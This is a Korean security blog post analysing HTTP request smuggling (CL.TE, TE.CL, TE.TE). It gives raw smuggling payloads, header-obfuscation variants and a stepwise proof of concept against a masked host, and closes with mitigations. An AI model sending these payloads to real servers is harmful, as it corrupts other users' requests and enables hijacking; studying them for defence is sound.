---
title: "HTTP Request Smuggling: CL.TE와 TE.CL 공격 기법"
date: 2021-01-01
description: "HTTP Request Smuggling(HTTP DeSync Attack) 공격 분석: CL.TE, TE.CL 역직렬화 취약점이 프론트엔드 보안 통제를 우회하고 백엔드 요청 큐를 오염시키는 방법"
tags: ["HTTP", "request-smuggling", "web", "CL.TE", "TE.CL", "desync", "web-security"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 취약점 개요

HTTP Request Smuggling(HTTP DeSync Attack)은 프론트 서버와 백엔드 서버의 처리 방식 차이를 이용하여, 사용자로부터 수신된 하나 또는 여러 개의 HTTP 요청의 처리 순서를 방해하는 기법이다.

![HTTP Request Smuggling 개요](/images/blog/http-request-smuggling/Untitled.png)

Request Smuggling 공격은 공격자가 보안 장치를 우회하고, 인가되지 않은 민감한 데이터에 접근하여 탈취하거나, 다른 애플리케이션 사용자에게 직접 피해를 줄 수 있는 공격이다.

## 취약점 상세

사용자는 프론트엔드 서버에 요청을 보내고, 서버는 백엔드 서버에 하나 이상의 요청을 포워딩한다.

프론트엔드 서버가 HTTP 요청을 백엔드 서버로 포워딩할 때, 일반적으로 동일한 백엔드 네트워크 연결을 통해 여러 개의 요청을 전송하는데, 이는 더 효율적이고 고능률적이기 때문이다. HTTP 요청은 순서대로 전송되며, 요청을 받은 서버는 한 개의 요청이 어디서 끝나고 다음 요청이 어디서 시작하는지 알아야 하기 때문에 HTTP 요청 헤더를 분석한다.

![프론트엔드에서 백엔드로의 포워딩](/images/blog/http-request-smuggling/Untitled 1.png)

이 상황에서 프론트엔드와 백엔드 시스템이 요청 간의 경계에 동의하는 것이 중요하다. 그렇지 않으면 두 시스템이 서로 다르게 해석하는 모호한 요청을 공격자가 전송할 수 있다.

![요청 경계 역직렬화](/images/blog/http-request-smuggling/Untitled 2.png)

공격자는 백엔드 서버에서 프론트엔드 요청의 일부를 다음 요청의 시작으로 해석하게 만든다. 이것이 다음 요청의 앞에 효과적으로 추가되므로, 애플리케이션이 후속 요청을 처리하는 방식에 방해가 된다. 이것이 HTTP Request Smuggling 공격이다.

이 공격이 가능한 근본 원인은 웹 서버가 인터넷에 직접 노출되는 경우가 드물기 때문이다. 로드 밸런서, 리버스 프록시 등 앞단에서 요청을 받아 전달하거나 분배하는 서버가 존재하는데, 이 앞단 서버에서 뒷단 서버로 전달하는 과정에서 chunked 인코딩이나 `Content-Length` 헤더를 만나면 지정된 크기만큼만 처리하고 나머지 패킷을 버퍼에 남겨두게 된다. 이 남겨진 패킷 데이터가 다른 사용자의 요청에서 처리되어 영향을 미치게 된다.

결국 계산된 크기만큼 처리하고 `GET /test` 같은 형태의 값을 삽입하면, 다음 소켓 사용자의 웹 요청 시작 부분이 `GET /test`로 시작하게 되어 다른 사용자의 액션을 변경할 수 있다.

사용자 요청을 제어할 수 있기 때문에 XSS, Open Redirect 등의 공격은 물론이고, 중요 데이터를 공격자 서버로 전송하는 것과 같은 다양한 공격이 가능하다. 이는 본질적으로 HTTP 응답에 대한 Injection이다.

## 분석 방법

이 공격을 시도하려면 Burp Suite의 `http-request-smuggler` 확장 도구를 사용하는 것이 가장 편리하다.

테스트 방법은 우선 `Content-Length`와 `Transfer-Encoding` 헤더를 이용하여 앞단 서버와 뒷단 서버가 각각 어떤 길이를 신뢰하는지 확인하는 것이다.

### CL.TE — 프론트(Content-Length), 백엔드(Transfer-Encoding)

프론트엔드는 `Content-Length: 13`을 보고 `SMUGGLED`를 포함한 POST Body 전체를 백엔드로 전송한다. 백엔드는 chunked 인코딩을 사용하기 때문에 `0\r\n`을 기준으로 각각의 요청으로 분리하여 판단한다. 따라서 `0` 위까지만 요청으로 처리하고, `SMUGGLED`부터는 백엔드 연결 버퍼에 남아 다음 요청에 이어붙여진다.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — 프론트(Transfer-Encoding), 백엔드(Content-Length)

CL.TE와 반대인 케이스다. 프론트는 `0\r\n` 기준으로 분리하여 전체 POST Body를 백엔드로 전송한다. 백엔드는 `Content-Length: 3`을 참고하기 때문에 3바이트, 즉 `8`과 개행 문자(`\r\n`)까지만 처리하고 나머지는 버퍼에서 대기한다. 따라서 다음 요청은 `SMUGGLED`로 시작하게 된다.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

프론트는 chunked 인코딩을 보기 때문에 전체 내용을 전송하지만, 백엔드는 `Content-Length`를 보고 `8`(+`\r\n`)까지만 처리한다. 그로 인해 다음 요청은 `SMUGGLED`로 시작하게 된다.

### TE.TE — 프론트(Transfer-Encoding), 백엔드(Transfer-Encoding)

CL.TE, TE.CL의 대응 방안일 수 있으나, 개행 문자 등을 이용하여 우회할 수 있는 여지가 있다.

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

이러한 문자 처리 차이를 이용하여 프론트엔드와 백엔드 중 하나가 `Transfer-Encoding` 헤더를 처리하지 않도록 우회를 유도하는 것이다.

실제 취약한지 판단하려면 요청 이후 다음 요청에서 `SMUGGLED`로 시작하는 웹 요청이 처리됐는지, 즉 임의의 웹 요청이 처리되는지 알아야 한다. 단순한 문자열로는 에러 기반으로 감지해야 하고, 그렇지 않은 경우에는 테스트 서버 페이지로 요청을 보내거나 식별 가능한 요청(404, response 조작 등)을 던져야 한다. 그리고 아주 빠르게 다음 요청을 선점하여 공격 여부를 식별해야 한다.

**주의:** 테스트 자체가 불특정 다수에게 피해를 줄 수 있다. chunked 인코딩으로 인해 서버가 대기 상태에서 다른 사용자의 요청이 변조되기 때문에, 테스터도 즉각적인 인지가 어렵고 테스터의 환경에서만 재현되는 것이 아니라 캐시 포이즈닝처럼 해당 요청 순서에 걸린 사용자에게 트리거된다. 실 서비스 대상으로는 매우 조심해야 한다.

## POC

테스트 케이스로 대략적인 형태를 설명하겠다. (TE.TE 우회로 인한 TE.CL)

**Step 1 — Content-Length와 Transfer-Encoding 정렬 확인:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 12
Transfer-Encoding : chunked

4
test
0
```

`Content-Length`(0까지 길이 12)와 `Transfer-Encoding`(0\r\n의 위치)의 크기가 일치할 때 → **정상 처리**

**Step 2 — 길이 불일치 도입으로 백엔드 신뢰 감지:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
0

X
```

`Content-Length`는 13(X까지)이고 `Transfer-Encoding` 경계는 12(0\r\n까지)로 크기가 일치하지 않는다. 결과: **백엔드에서 13번째 바이트 `X`를 기다리며 멈춤.**

- 프론트에선 `0\r\n`까지 보고 `0`까지 데이터를 넘겼지만, 백엔드에선 크기를 13으로 보기 때문에 12의 크기만 도착하여 멈춘 상태

이 상황으로 프론트는 TE(Transfer-Encoding), 백엔드는 CL(Content-Length)을 신뢰한다는 것을 알 수 있다.

**Step 3 — 스머글링된 요청 삽입:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
e3
GET /otherurl HTTP/1.1
Host: targethost?
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

`Content-Length: 13`(`e3\r\n`까지)을 지정하여 전송하면, 프론트는 TE를 보기 때문에 요청 전문을 전달하고, 백엔드는 CL을 보기 때문에 `GET /otherurl` 이전 부분까지만 처리하고 나머지는 백엔드에 남아 다음 요청을 대기하게 된다.

그러면 다른 사용자 또는 테스터의 요청이 해당 백엔드 서버로 넘어갈 때, 의도한 요청(`POST ...`)이 아닌 `GET /otherurl`을 타게 되어 Redirect, XSS, Session Hijack 등 다양한 문제를 발생시킬 여지가 생긴다.

## 대응 방안

현재 대응 방안은 제한적이며 운영 비용이 크다:

- **서버 간 통신 시 HTTP/2 사용** — CL/TE 모호성을 완전히 제거하지만, 대규모 인프라 변경이 필요
- **프론트엔드와 백엔드 간 동일한 헤더를 신뢰하도록 통일** — 두 서버가 어떤 헤더를 우선시할지 합의해야 하며, 이 역시 대규모 조정이 필요
- **프록시 레이어에서 직접 검증** — 가능하지만 상당한 성능 저하가 수반될 수 있음

핵심 요점: 공격은 서버 레이어 간의 헤더 신뢰 불일치에 의존하며, 실제 공격 시에는 각 길이값을 정확하게 계산해야 하고, 실 서비스에서는 조심스럽게 테스트해야 한다.
